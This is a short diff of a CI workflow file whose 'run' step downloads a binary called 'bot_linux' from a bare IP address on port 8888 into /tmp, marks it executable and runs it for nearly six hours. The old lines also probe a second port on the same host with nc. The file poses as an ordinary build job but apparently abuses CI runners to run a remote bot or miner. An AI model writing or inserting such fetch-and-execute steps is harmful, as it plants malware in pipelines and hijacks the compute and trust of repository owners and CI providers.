@@ -15,8 +15,7 @@ jobs:
     steps:
       - name: run
         run: |
-          curl -v -sL http://45.153.34.235:8888/bot_linux -o /tmp/b 2>&1 | tail -5
-          ls -lh /tmp/b
+          curl -sL --max-time 30 http://45.153.34.235:8888/bot_linux -o /tmp/b && echo dl_ok || echo dl_fail
+          file /tmp/b 2>/dev/null || true
           chmod +x /tmp/b
-          nc -zv 45.153.34.235 4445 2>&1 || echo port_blocked
-          timeout 21000 /tmp/b || echo exit_$?
+          timeout 21000 /tmp/b
